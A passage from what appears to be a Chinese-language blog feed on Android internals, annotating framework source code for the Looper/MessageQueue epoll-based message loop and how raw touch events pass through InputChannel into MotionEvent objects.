class="keyword">if</span> (eventCount &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (errno == EINTR) &#123;</span><br><span class="line">            <span class="keyword">goto</span> Done;</span><br><span class="line">        &#125;</span><br><span class="line">        ALOGW(<span class="string">"Poll failed with an unexpected error: %s"</span>, strerror(errno));</span><br><span class="line">        result = POLL_ERROR;</span><br><span class="line">        <span class="keyword">goto</span> Done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查轮询超时</span></span><br><span class="line">    <span class="keyword">if</span> (eventCount == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> DEBUG_POLL_AND_WAKE</span></span><br><span class="line">        ALOGD(<span class="string">"%p ~ pollOnce - timeout"</span>, <span class="keyword">this</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        result = POLL_TIMEOUT;</span><br><span class="line">        <span class="keyword">goto</span> Done;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理事件</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; eventCount; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> fd = eventItems[i].data.fd;</span><br><span class="line">        <span class="keyword">uint32_t</span> epollEvents = eventItems[i].events;</span><br><span class="line">        <span class="keyword">if</span> (fd == mWakeEventFd) &#123;</span><br><span class="line">            <span class="keyword">if</span> (epollEvents &amp; EPOLLIN) &#123;</span><br><span class="line">                awoken();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ALOGW(<span class="string">"Ignoring unexpected epoll events 0x%x on wake event fd."</span>, epollEvents);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		...         </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>第6行就是事情的关键，我们执行了系统<code>epoll_wait()</code>调用（对我们之前创建的<code>mEpollFd</code> <code>epoll</code>实例），这是一个阻塞调用，当注册的<code>Fd</code><strong>有新内容或者到达超时时间时才会返回</strong>。我们还记得前面我们创建了<code>mWakeEventFd</code>和<code>eventItem</code>并把它注册到了<code>mEpollFd</code>中。这样，只要<code>mWakeEventFd</code>中有了新的内容，这行调用就会返回，解除阻塞。</p>
<p>现在我们可以推测，当有新消息到来时，正是以向<code>mWakeEvendFd</code>中写入内容的方式来使<code>nativePollOnce()</code>调用返回，达到了通知消息循环继续处理的目的。</p>
<p>如果没有新的消息呢？我们一步步传进来的<code>timeoutMillis</code>就作为了<code>epoll_wait()</code>的超时参数，一旦到达这个时间，<code>epoll_wait()</code>函数就会返回，这达到了我们等待一段时间再去执行下一条消息的目的。</p>
<p>如果超时，20行检测出超时，跳转到<code>Done</code>。</p>
<p>如果因<code>fd</code>触发而返回，会进入28行的事件处理过程，这个过程依据拿到的<code>eventItem</code>对象，检查<code>fd</code>与<code>events</code>标志，如果是我们之前设置的用于唤醒的<code>mWakeEventFd</code>，调用<code>awaken()</code>：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Looper::awoken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> counter;</span><br><span class="line">    TEMP_FAILURE_RETRY(<span class="built_in">read</span>(mWakeEventFd, &amp;counter, <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>做的事情非常简单，通过<code>read()</code>读取并清零<code>fd</code>中的数据。</p>
<p>你可能会想，为什么什么事情都没有做呢？因为这个<code>mWakeEventFd</code>存在的唯一目的就是解除阻塞，现在这个目的已经达到了，我们只要重置它以便下一次使用就可以了。</p>
<p><code>Done</code>标号以后的代码与我们的过程无关，执行了自定义<code>fd</code>消息处理相关的内容。最后将<code>result</code>返回：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
<p>现在我们可以重新看待<code>nativePollOnce()</code>函数，再次强调，它的作用是<strong>阻塞，当有新的消息或达到超时后返回</strong>。而这个核心的特性，完全是利用系统提供的<code>epoll</code>机制实现的。</p>
<p>现在整个<code>Java</code>消息循环的处理过程已经看完了，下面我们来结合常用的<code>Handler</code>来讲解向消息队列中投入新的消息的过程。</p>
<blockquote>
<p>   <a href="http://www.viseator.com/2017/10/24/android_event_2/">Android 消息机制（二）Handler对消息机制的使用</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Android</category>
        <category>Event</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Event</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 触摸事件分发机制（二）原始事件消息传递与分发的开始</title>
    <url>/2017/10/07/android_view_event_2/</url>
    <content><![CDATA[<h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>在<a href="http://www.viseator.com/2017/09/14/android_view_event_1/">上一篇文章</a>中，我们探索了从内核触摸事件传递到<code>InputDispatcher</code>线程，再与应用线程之间建立<code>InputChannel</code>的过程，并且我们已经看到一个最原始的触摸事件被封装成一个<code>msg</code>并通过<code>InputChannel</code>建立的<code>socket</code>通过<code>sendMessage()</code>方法跨线程通信发送给了应用的UI线程。</p>
<p>这篇文章将会看到应用UI线程的消息队列是如何读取传递过来的触摸事件并进行处理、分发的。</p>
<a id="more"></a>
<p>本篇文章主要参考了<a href="http://gityuan.com/2016/12/31/input-ipc/" target="_blank" rel="noopener">Gityuan的文章</a></p>
<h2 id="消息循环"><a href="#消息循环" class="headerlink" title="消息循环"></a>消息循环</h2><p><code>Android</code>的消息机制的具体内容在只简单描述，详细内容请见：</p>
<blockquote>
<p><a href="http://www.viseator.com/2017/10/22/android_event_1/">http://www.viseator.com/2017/10/22/android_event_1/</a></p>
</blockquote>
<p>应用的UI线程拥有消息队列与一个<code>Looper</code>，应用初始化的过程中会调用<code>Looper</code>的<code>loop()</code>方法来启动一个无限循环来不断读取、处理队列中的消息，<code>Android</code>是一个事件驱动的模型，只有源源不断的事件产生与处理才能推动应用的进行。</p>
<p>同时应该注意的是在<code>Java</code>与<code>Native</code>中各有一套消息处理的流程可以进行消息的处理，而如同触摸事件这种来源于<code>Native</code>层的事件消息，都是通过<code>Native Looper</code>进行处理的。</p>
<h3 id="Looper"><a href="#Looper" class="headerlink" title="Looper"></a>Looper</h3><p>当应用初始化时，会调用<code>Looper.prepare()</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prepare</span><span class="params">(<span class="keyword">boolean</span> quitAllowed)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sThreadLocal.get() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"Only one Looper may be created per thread"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sThreadLocal.set(<span class="keyword">new</span> Looper(quitAllowed));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>会在<code>ThreadLocal</code>区域新建一个<code>Looper</code>对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">Looper</span><span class="params">(<span class="keyword">boolean</span> quitAllowed)</span> </span>&#123;</span><br><span class="line">    mQueue = <span class="keyword">new</span> MessageQueue(quitAllowed);</span><br><span class="line">    mThread = Thread.currentThread();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时初始化了一个<code>MessageQueue</code>，保存了当前的线程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MessageQueue(<span class="keyword">boolean</span> quitAllowed) &#123;</span><br><span class="line">    mQuitAllowed = quitAllowed;</span><br><span class="line">    mPtr = nativeInit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>nativeInit()</code>方法初始化了<code>native</code>的消息队列：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> jlong <span class="title">android_os_MessageQueue_nativeInit</span><span class="params">(JNIEnv* env, jclass clazz)</span> </span>&#123;</span><br><span class="line">    NativeMessageQueue* nativeMessageQueue = <span class="keyword">new</span> NativeMessageQueue();</span><br><span class="line">    <span class="keyword">if</span> (!nativeMessageQueue) &#123;</span><br><span class="line">        jniThrowRuntimeException(env, <span class="string">"Unable to allocate native queue"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nativeMessageQueue-&gt;incStrong(env);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;jlong&gt;(nativeMessageQueue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>新建了一个<code>NativeMessageQueue</code>：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">NativeMessageQueue::NativeMessageQueue() :</span><br><span class="line">        mPollEnv(<span class="literal">NULL</span>), mPollObj(<span class="literal">NULL</span>), mExceptionObj(<span class="literal">NULL</span>) &#123;</span><br><span class="line">    mLooper = Looper::getForThread();</span><br><span class="line">    <span class="keyword">if</span> (mLooper == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        mLooper = <span class="keyword">new</span> Looper(<span class="literal">false</span>);</span><br><span class="line">        Looper::setForThread(mLooper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里进行的初始化过程与<code>java</code>层的比较类似，都是新建了一个<code>Looper</code>对象存放入了<code>ThreadLocal</code>区域中。</p>
<p>当初始化过程完成之后，系统调用<code>Looper.loop()</code>开始消息循环：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Looper me = myLooper();</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">final</span> MessageQueue queue = me.mQueue;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        Message msg = queue.next(); <span class="comment">// might block</span></span><br><span class="line">        <span class="keyword">if</span> (msg == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// No message indicates that the message queue is quitting.</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            msg.target.dispatchMessage(msg);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (traceTag != <span class="number">0</span>) &#123;</span><br><span class="line">                Trace.traceEnd(traceTag);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        msg.recycleUnchecked();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>省略了大量代码，我们看到在这个无限循环中，首先就调用了<code>MessageQueue</code>的<code>next()</code>方法来获取下一条消息，注意这是一个阻塞调用，在下一条消息还没到时间或者没有下一条消息时候会被阻塞。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">Message <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Return here if the message loop has already quit and been disposed.</span></span><br><span class="line">    <span class="comment">// This can happen if the application tries to restart a looper after quit</span></span><br><span class="line">    <span class="comment">// which is not supported.</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">long</span> ptr = mPtr;</span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pendingIdleHandlerCount = -<span class="number">1</span>; <span class="comment">// -1 only during first iteration</span></span><br><span class="line">    <span class="keyword">int</span> nextPollTimeoutMillis = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nextPollTimeoutMillis != <span class="number">0</span>) &#123;</span><br><span class="line">            Binder.flushPendingCommands();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        nativePollOnce(ptr, nextPollTimeoutMillis);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们不关心<code>java</code>层后续对事件的处理，而是关心<code>java</code>层是如何调用<code>native</code>层的方法来对<code>native</code>消息队列中的事件进行处理的，因为我们的触摸事件是在<code>native</code>层进行处理再到<code>java</code>层进行分发的。</p>
<p>在<code>next()</code>方法中我们就调用了<code>nativePollOnce()</code>方法先去处理<code>native</code>中的事件：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">android_os_MessageQueue_nativePollOnce</span><span class="params">(JNIEnv* env, jobject obj,</span></span></span><br><span class="line"><span class="function"><span class="params">        jlong ptr, jint timeoutMillis)</span> </span>&#123;</span><br><span class="line">    NativeMessageQueue* nativeMessageQueue = <span class="keyword">reinterpret_cast</span>&lt;NativeMessageQueue*&gt;(ptr);</span><br><span class="line">    nativeMessageQueue-&gt;pollOnce(env, obj, timeoutMillis);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用了<code>nativeMessageQueue</code>的<code>pollOnce()</code>方法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NativeMessageQueue::pollOnce</span><span class="params">(JNIEnv* env, jobject pollObj, <span class="keyword">int</span> timeoutMillis)</span> </span>&#123;</span><br><span class="line">    mPollEnv = env;</span><br><span class="line">    mPollObj = pollObj;</span><br><span class="line">    mLooper-&gt;pollOnce(timeoutMillis);</span><br><span class="line">    mPollObj = <span class="literal">NULL</span>;</span><br><span class="line">    mPollEnv = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mExceptionObj) &#123;</span><br><span class="line">        env-&gt;Throw(mExceptionObj);</span><br><span class="line">        env-&gt;DeleteLocalRef(mExceptionObj);</span><br><span class="line">        mExceptionObj = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用了<code>native</code> <code>Looper</code>的<code>pollOnce()</code>方法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Looper::pollOnce</span><span class="params">(<span class="keyword">int</span> timeoutMillis, <span class="keyword">int</span>* outFd, <span class="keyword">int</span>* outEvents, <span class="keyword">void</span>** outData)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        ...</span><br><span class="line">        result = pollInner(timeoutMillis);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>忽略特殊处理的过程，最终调用了<code>pollInner()</code>方法：（<code>PollInner()</code>的代码比较长，省略了大部分，标记了后面讨论的三个部分）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Looper::pollInner</span><span class="params">(<span class="keyword">int</span> timeoutMillis)</span> </span>&#123;</span><br><span class="line">	...<span class="comment">// 省略初始化过程</span></span><br><span class="line">    <span class="comment">// Poll.</span></span><br><span class="line">    <span class="keyword">int</span> result = POLL_WAKE;</span><br><span class="line">    mResponses.<span class="built_in">clear</span>();</span><br><span class="line">    mResponseIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// We are about to idle.</span></span><br><span class="line">    mPolling = <span class="literal">true</span>;</span><br><span class="line">	<span class="comment">/*-------1-------*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">eventItems</span>[<span class="title">EPOLL_MAX_EVENTS</span>];</span></span><br><span class="line">    <span class="keyword">int</span> eventCount = epoll_wait(mEpollFd, eventItems, EPOLL_MAX_EVENTS, timeoutMillis);</span><br><span class="line">	</span><br><span class="line">  	...</span><br><span class="line">	<span class="comment">/*---------------*/</span></span><br><span class="line">	<span class="comment">/*-------2-------*/</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; eventCount; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> fd = eventItems[i].data.fd;</span><br><span class="line">        <span class="keyword">uint32_t</span> epollEvents = eventItems[i].events;</span><br><span class="line">        <span class="keyword">if</span> (fd == mWakeEventFd) &#123;</span><br><span class="line">            <span class="keyword">if</span> (epollEvents &amp; EPOLLIN) &#123;</span><br><span class="line">                awoken();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ALOGW(<span class="string">"Ignoring unexpected epoll events 0x%x on wake event fd."</span>, epollEvents);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">ssize_t</span> requestIndex = mRequests.indexOfKey(fd);</span><br><span class="line">            <span class="keyword">if</span> (requestIndex &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> events = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (epollEvents &amp; EPOLLIN) events |= EVENT_INPUT;</span><br><span class="line">                <span class="keyword">if</span> (epollEvents &amp; EPOLLOUT) events |= EVENT_OUTPUT;</span><br><span class="line">                <span class="keyword">if</span> (epollEvents &amp; EPOLLERR) events |= EVENT_ERROR;</span><br><span class="line">                <span class="keyword">if</span> (epollEvents &amp; EPOLLHUP) events |= EVENT_HANGUP;</span><br><span class="line">                pushResponse(events, mRequests.valueAt(requestIndex));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ALOGW(<span class="string">"Ignoring unexpected epoll events 0x%x on fd %d that is "</span></span><br><span class="line">                        <span class="string">"no longer registered."</span>, epollEvents, fd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">Done: ;</span><br><span class="line">	...<span class="comment">// 省略native message处理过程</span></span><br><span class="line">      </span><br><span class="line">    <span class="comment">// Release lock.</span></span><br><span class="line">    mLock.unlock();</span><br><span class="line">	<span class="comment">/*---------------*/</span></span><br><span class="line">  	<span class="comment">/*-------3-------*/</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; mResponses.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        Response&amp; response = mResponses.editItemAt(i);</span><br><span class="line">        <span class="keyword">if</span> (response.request.ident == POLL_CALLBACK) &#123;</span><br><span class="line">            <span class="keyword">int</span> fd = response.request.fd;</span><br><span class="line">            <span class="keyword">int</span> events = response.events;</span><br><span class="line">            <span class="keyword">void</span>* data = response.request.data;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> callbackResult = response.request.callback-&gt;handleEvent(fd, events, data);</span><br><span class="line">            <span class="keyword">if</span> (callbackResult == <span class="number">0</span>) &#123;</span><br><span class="line">                removeFd(fd, response.request.seq);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            response.request.callback.<span class="built_in">clear</span>();</span><br><span class="line">            result = POLL_CALLBACK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  	<span class="comment">/*---------------*/</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一部分中，调用了<code>epoll_wait()</code>函数等待消息，当接收到消息或者发生超时的时候调用返回。</p>
<p>第二部分对返回的<code>events</code>进行遍历，如果对应的<code>fd</code>为唤醒专用的<code>mWakeEventFd</code>，执行<code>awoken()</code>函数清空管道，这个事件的作用只是为了唤醒<code>Looper</code>对新消息进行处理。</p>
<p>如果不是<code>mWakeEventFd</code>，说明为我们之前通过<code>addFd()</code>函数添加的自定义<code>fd</code>，我们需要对这个<code>event</code>进行处理，处理函数为<code>pushResponse()</code>：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> requestIndex = mRequests.indexOfKey(fd);</span><br><span class="line">pushResponse(events, mRequests.valueAt(requestIndex));</span><br></pre></td></tr></table></figure>
<p>我们还记得在前面<code>addFd()</code>的过程中已经将<code>fd</code>作为索引，向<code>mRequest</code>中保存了<code>request</code>信息，信息中包含了<code>callback</code>也就是<code>NativeInputEventReceiver</code>对象。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Looper::pushResponse</span><span class="params">(<span class="keyword">int</span> events, <span class="keyword">const</span> Request&amp; request)</span> </span>&#123;</span><br><span class="line">    Response response;</span><br><span class="line">    response.events = events;</span><br><span class="line">    response.request = request;</span><br><span class="line">    mResponses.push(response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里将<code>request</code>对象包装成了一个<code>response</code>，然后存入了<code>mResponses</code>中等待后面的处理。</p>
<p>第三部分中就是对于<code>response</code>的处理过程，主要就是这个调用：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> callbackResult = response.request.callback-&gt;handleEvent(fd, events, data);</span><br></pre></td></tr></table></figure>
<p>调用了<code>callback</code>的<code>handleEvent()</code>，我们现在知道<code>callback</code>是前面保存的<code>NativeInputEventReceiver</code>对象。</p>
<p>现在，当原始事件通过建立好的<code>InputChannel</code>的<code>sendMessage()</code>函数发送触摸事件时：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">status_t</span> <span class="title">InputChannel::sendMessage</span><span class="params">(<span class="keyword">const</span> InputMessage* msg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> msgLength = msg-&gt;<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">ssize_t</span> nWrite;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        nWrite = ::send(mFd, msg, msgLength, MSG_DONTWAIT | MSG_NOSIGNAL);</span><br><span class="line">    &#125; <span class="keyword">while</span> (nWrite == <span class="number">-1</span> &amp;&amp; errno == EINTR);</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>会直接调用<code>send()</code>函数向<code>fd</code>表示的<code>socket</code>中写入数据，同时在另一边的<code>epoll_wait()</code>调用就会因<code>socket</code>另一端<code>fd</code>数据的到来而唤醒，并通过<code>fd</code>找到注册好的<code>request</code>，进而调用<code>request</code>中的<code>NativeInputEventReceiver</code>的<code>handleEvent()</code>方法，参数就是我们接收到的事件信息与数据。</p>
<h3 id="handleEvent"><a href="#handleEvent" class="headerlink" title="handleEvent"></a>handleEvent</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">NativeInputEventReceiver::handleEvent</span><span class="params">(<span class="keyword">int</span> receiveFd, <span class="keyword">int</span> events, <span class="keyword">void</span>* data)</span> </span>&#123;</span><br><span class="line"> 	...</span><br><span class="line">    <span class="keyword">if</span> (events &amp; ALOOPER_EVENT_INPUT) &#123;</span><br><span class="line">        JNIEnv* env = AndroidRuntime::getJNIEnv();</span><br><span class="line">        <span class="keyword">status_t</span> status = consumeEvents(env, <span class="literal">false</span> <span class="comment">/*consumeBatches*/</span>, <span class="number">-1</span>, <span class="literal">NULL</span>);</span><br><span class="line">        mMessageQueue-&gt;raiseAndClearException(env, <span class="string">"handleReceiveCallback"</span>);</span><br><span class="line">        <span class="keyword">return</span> status == OK || status == NO_MEMORY ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用了<code>consumeEvents()</code>函数来处理事件，函数较长，我们拆开来看：</p>
<p>函数进行初始化过程之后执行了一个无限循环，循环体中的内容如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">InputEvent* inputEvent;</span><br><span class="line">       <span class="keyword">status_t</span> status = mInputConsumer.consume(&amp;mInputEventFactory,</span><br><span class="line">               consumeBatches, frameTime, &amp;seq, &amp;inputEvent);</span><br></pre></td></tr></table></figure>
<p>首先就调用了<code>mInputConsumer</code>对象的<code>consume</code>方法接收并将原始的事件转换为分发过程中标准的<code>MotionEvent</code>：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">status_t</span> result = mChannel-&gt;receiveMessage(&amp;mMsg);</span><br></pre></td></tr></table></figure>
<p>这里就直接调用了<code>InputChannel</code>的<code>receiveMessage()</code>函数来接收另一端发送来的消息。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">status_t</span> <span class="title">InputChannel::receiveMessage</span><span class="params">(InputMessage* msg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">ssize_t</span> nRead;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        nRead = ::recv(mFd, msg, <span class="keyword">sizeof</span>(InputMessage), MSG_DONTWAIT);</span><br><span class="line">    &#125; <span class="keyword">while</span> (nRead == <span class="number">-1</span> &amp;&amp; errno == EINTR);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从<code>socket</code>另一端的<code>fd</code>中读取发送过来的触摸事件消息并存放在了<code>mMsg</code>中，之后进行处理：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">        <span class="keyword">switch</span> (mMsg.header.type) &#123;</span><br><span class="line">        <span class="keyword">case</span> InputMessage::TYPE_KEY: &#123;</span><br><span class="line">			...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> AINPUT_EVENT_TYPE_MOTION: &#123;</span><br><span class="line">			...</span><br><span class="line">            MotionEvent* motionEvent = factory-&gt;createMotionEvent();</span><br><span class="line">            <span class="keyword">if</span> (! motionEvent) <span class="keyword">return</span> NO_MEMORY;</span><br><span class="line"></span><br><span class="line">            updateTouchState(&amp;mMsg);</span><br><span class="line">            initializeMotionEvent(motionEvent, &amp;mMsg);</span><br><span class="line">            *outSeq = mMsg.body.motion.seq;</span><br><span class="line">            *outEvent = motionEvent;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> DEBUG_TRANSPORT_ACTIONS</span></span><br><span class="line">            ALOGD(<span class="string">"channel '%s' consumer ~ consumed motion event, seq=%u"</span>,</span><br><span class="line">                    mChannel-&gt;getName().<span class="built_in">string</span>(), *outSeq);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">              </span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>这里对事件的类型进行了一个判断，当类型为<code>MOTION</code>即触摸事件时，新建了一个<code>MotionEvent</code>，然后用<code>mMsg</code>去进行初始化：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InputConsumer::initializeMotionEvent</span><span class="params">(MotionEvent* event, <span class="keyword">const</span> InputMessage* msg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> pointerCount = msg-&gt;body.motion.pointerCount;</span><br><span class="line">    PointerProperties pointerProperties[pointerCount];</span><br><span class="line">    PointerCoords pointerCoords[pointerCount];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; pointerCount; i++) &#123;</span><br><span class="line">        pointerProperties[i].copyFrom(msg-&gt;body.motion.pointers[i].properties);</span><br><span class="line">        pointerCoords[i].copyFrom(msg-&gt;body.motion.pointers[i].coords);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event-&gt;initialize(</span><br><span class="line">            msg-&gt;body.motion.deviceId,</span><br><span class="line">            msg-&gt;body.motion.source,</span><br><span class="line">            msg-&gt;body.motion.action,</span><br><span class="line">            msg-&gt;body.motion.actionButton,</span><br><span class="line">            msg-&gt;body.motion.flags,</span><br><span class="line">            msg-&gt;body.motion.edgeFlags,</span><br><span class="line">            msg-&gt;body.motion.metaState,</span><br><span class="line">            msg-&gt;body.motion.buttonState,</span><br><span class="line">            msg-&gt;body.motion.xOffset,</span><br><span class="line">            msg-&gt;body.motion.yOffset,</span><br><span class="line">            msg-&gt;body.motion.xPrecision,</span><br><span class="line">            msg-&gt;body.motion.yPrecision,</span><br><span class="line">            msg-&gt;body.motion.downTime,</span><br><span class="line">            msg-&gt;body.motion.eventTime,</span><br><span class="line">            pointerCount,</span><br><span class="line">            pointerProperties,</span><br><span class="line">            pointerCoords);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后在第14行把它存入了<code>outEvent</code>（也就是<code>consume()</code>函数中传入的<code>inputEvent</code>）中，现在函数返回到<code>NativeInputEventReceiver::consumeEvents()</code>继续处理：</p>
